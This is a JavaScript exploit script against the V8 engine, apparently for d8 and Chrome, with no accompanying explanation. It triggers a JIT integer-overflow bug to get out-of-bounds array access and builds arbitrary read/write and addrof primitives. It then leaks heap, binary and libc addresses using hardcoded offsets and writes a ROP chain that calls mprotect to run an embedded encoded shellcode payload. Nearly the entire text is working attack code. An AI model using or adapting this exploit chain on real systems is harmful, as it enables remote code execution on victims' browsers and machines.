
class Memory {
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
    }
    f2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

let mem = new Memory();

var arrs = [[]];

function fake() {
    let ob = {marker:1.2,obj:{}};
    objs.push(ob);
    let oa = new ArrayBuffer(0x432);
    bufs.push(oa);
}


function opt_me(x) {
    let a = [1.1,1.2,1.3,1.4,1.5,1.6];
    let b = [1,2,3];

    arrs.push(a);
    // fake();
    //
    // let ob = {marker:0xaaaa,obj:{}};
    // objs.push(ob);
    // let oa = new ArrayBuffer(0x40);
    // bufs.push(oa);

    let t = x ? 4503599627370491 : 4503599627370493;
    t = t + 3;
    t = t * 2;
    t = t + 1;
    t = t + 1;

    t = t - 9007199254740990;
    t = t * 2;
    t = t + 1;
    // console.log(t);
    // %DebugPrint(a);
    // %DebugPrint(b);
    a[t] =   2.1729236899484e-311;//mem.u2f(0x60000000000);
}

opt_me(true);
for (let i = 0; i < 0x10000; i++){
    opt_me(true);
}
let leak = opt_me(false);

// console.log(mem.f2u(leak).toString(16));
//
var vicobj = {marker:0x41414141,obj:{}};
let vicbuf = new ArrayBuffer(0x432);

let oob_arr = arrs.pop();
// %DebugPrint(oob_arr);
// %DebugPrint(vicobj);
// %DebugPrint(vicbuf);


let bufarraddoffset = 0;
let objoffset = 0

for (let i = 0; i < oob_arr.length; i++) {
    // console.log(i.toString() +   " spray memory: 0x" + mem.f2u(oob_arr[i]).toString(16));
    // if (oob_arr[i] === mem.u2f(0x400)) {
    if (oob_arr[i] === mem.u2f(0x432)) {
        bufarraddoffset = i + 1;
        break;
    }
}

for (let i = 0; i < oob_arr.length; i++){
    if (oob_arr[i] === mem.u2f(0x4141414100000000)) {
        objoffset = i + 1;
        break;
    }

}



console.log("[*] bufarraddoffset is " + bufarraddoffset.toString());
console.log("[*] objoffset is " + objoffset.toString());



class ARW{
    constructor(buf_offset, obj_offset){
        this.buf_offset = buf_offset;
        this.obj_offset = obj_offset;
    }
    read(addr){
        oob_arr[this.buf_offset] = mem.u2f(addr);
        let tmp = new Float64Array(vicbuf,0, 8);
        return mem.f2u(tmp[0]);
    }
    write(addr, data){
        oob_arr[this.buf_offset] = mem.u2f(addr);
        let tmp = new Float64Array(vicbuf, 0, 8);
        tmp.set([mem.u2f(data)])
    }
    addrof(one_obj){
        vicobj.obj = one_obj;
        return mem.f2u(oob_arr[this.obj_offset]);
    }
}
arw = new ARW(bufarraddoffset, objoffset);


leak_heap = mem.f2u(oob_arr[bufarraddoffset]);
console.log("[*] Leak heap addr is 0x" + leak_heap.toString(16));




// let fixarray_addr = mem.f2u() - 1;
// console.log("[*] Leak FixArray addr is 0x" + fixarray_addr.toString(16));
//
let mmap_addr = mem.f2u(oob_arr[6]) - 1;
console.log("[*] Leak mmap addr is 0x" + mmap_addr.toString(16));


let con_addr = arw.read(mmap_addr - 288) - 1;
console.log("[*] Leak con addr is 0x" + con_addr.toString(16));


let code_addr = arw.read(con_addr + 6*8) - 1;
console.log("[*] Leak code addr is 0x" + code_addr.toString(16));

let bin_leak = arw.read(code_addr + 0x42);
console.log("[*] Leak bin addr is 0x" + bin_leak.toString(16));

let d8_binoffset = 0xe868a0;
let chrome_binoffset = 0x40767e0;

let bin_base = bin_leak - d8_binoffset;

console.log("[*] binary base addr is 0x" + bin_base.toString(16));

let d8_mprotect_gotoffset = 0x00000000011600F0;
let chrome_mprotect_gotoffset = 0x0000000008DDBF40;

let mprotect_got = bin_base + d8_mprotect_gotoffset;
let libc_mprotect = arw.read(mprotect_got);

console.log("[*] Leak mprotect addr is 0x" + libc_mprotect.toString(16));

let libc_base = libc_mprotect - 0x11bae0;
console.log("[*] Libc base is 0x" + libc_base.toString(16));

let envaddr = libc_base + 0x00000000003EE098 ;
let leak_stack = arw.read(envaddr);
console.log("[*] Leak stack is 0x" + leak_stack.toString(16));

let pop_rdi = libc_base + 0x000000000002155f;
let pop_rsi = libc_base + 0x0000000000023e6a;
let pop_rdx = bin_base + 0x00000000007c02a2;
let retn = libc_base + 0x00000000000301A7;


let sc = [0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xf7, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff,
    0xff, 0xff, 0x48, 0xbb, 0x41, 0x5f, 0xe0, 0xe6, 0x61, 0x30, 0xad, 0x88, 0x48, 0x31, 0x58,
    0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0x2b, 0x64, 0xb8, 0x7f, 0x29, 0x8b,
    0x82, 0xea, 0x28, 0x31, 0xcf, 0x95, 0x09, 0x30, 0xfe, 0xc0, 0xc8, 0xb8, 0x88, 0xcb, 0x02,
    0x30, 0xad, 0xc0, 0xc8, 0xb9, 0xb2, 0x0e, 0x7b, 0x30, 0xad, 0x88, 0x6e, 0x2a, 0x93, 0x94,
    0x4e, 0x52, 0xc4, 0xe6, 0x6e, 0x38, 0x8e, 0x89, 0x0c, 0x55, 0x80, 0xeb, 0x20, 0x33, 0x83,
    0x93, 0x0d, 0x51, 0xd9, 0xe7, 0x33, 0x5f, 0xb6, 0xb1, 0x29, 0xb9, 0x4b, 0x87, 0x44, 0x5f,
    0xe0, 0xe6, 0x61, 0x30, 0xad, 0x88];

let shellcode = new Uint8Array(0x443);
for (let i = 0; i < sc.length; i++){
    shellcode[i] = sc[i];
}


let shellcode_arr = arw.addrof(shellcode) - 1;
console.log("[*] shellcode arry is 0x" + shellcode_arr.toString(16));

let shellcode_ele = arw.read(shellcode_arr + 0x10) - 1;
console.log("[*] Shellcode element is 0x" + shellcode_ele.toString(16));

let shellcode_addr = arw.read(shellcode_ele + 0x18);
console.log("[*] Shellcode addr is 0x" + shellcode_addr.toString(16));


rop = [
    pop_rdi,
    parseInt((shellcode_addr /0x1000)) * 0x1000,
    pop_rsi,
    0x1000,
    pop_rdx,
    7,
    libc_mprotect,
    shellcode_addr
];
let rop_start = leak_stack - 8 * (rop.length);
for (let i = 0 ; i < rop.length; i++){
    arw.write(rop_start + 8 * i, rop[i]);
}
console.log("ret is 0x" + retn.toString(16));

// readline();

for (let i = 0; i < 0x300; i++){
    rop_start -= 8;
    arw.write(rop_start, retn);
}



readline();




// %SystemBreak();



